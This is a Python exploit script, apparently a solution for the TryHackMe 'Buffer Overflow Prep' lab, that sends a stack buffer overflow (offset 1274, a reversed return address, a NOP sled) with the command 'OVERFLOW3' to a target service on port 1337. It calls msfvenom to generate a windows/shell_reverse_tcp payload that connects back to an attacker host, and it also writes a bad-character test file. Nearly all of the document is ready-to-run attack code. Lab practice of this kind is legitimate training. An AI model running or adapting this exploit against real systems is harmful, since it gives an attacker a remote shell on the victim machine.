import os

def genPayload(LHOST, LPORT):
    ### Payload Generation ##############################################
    #LHOST="192.168.1.92"
    #LPORT="8888"
    badchars = "\\x00\\x11\\x40\\x5f\\xb8\\xee"
    command = "msfvenom -p windows/shell_reverse_tcp LHOST="+LHOST+" LPORT="+str(LPORT)+" EXITFUNC=thread  -b '"+badchars+"' -f py -o msfpayload.py"
    os.system(command)
    import msfpayload
    payload = msfpayload.buf #payload = first_stage + str(buf, 'ascii', errors='ignore')
    return payload
    #######################################################################

def exploit(payload, RHOST, RPORT):
    prefix = ""
    offset = 1274
    overflow = "A" * offset
    retn = "\x62\x50\x12\x03"[::-1]
    padding = "\x90"*10 #+ "\xcc"
    postfix = ""
    #payload = ""

    buffer = prefix + overflow + retn + padding + payload + postfix
    #print(len(buffer))
    #print([buffer])
    data = buffer

    import socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST,RPORT))
    s.send("OVERFLOW3 "+ buffer)
    
### bad Characters ##############
pp = ""
for x in range(1, 256):
  if x not in [0x0, 0x11, 0x40, 0x5f, 0xb8, 0xee]:
      #print("\\x" + "{:02x}".format(x), end='')
      pp += ("\\x" + "{:02x}".format(x))
      
#print(pp)
payload = eval('"'+pp+'"')
#print(payload)
with open("/media/sf_Stuff/Github/Solutions/Cyber Security/Penetration Testing Exercises/TryHackMe/Buffer Overflow Prep/binary.bin", "w") as f: f.write(payload)
##################################### 
 
payload = genPayload('10.8.52.126', 8888)
exploit(payload, '10.10.238.212', 1337)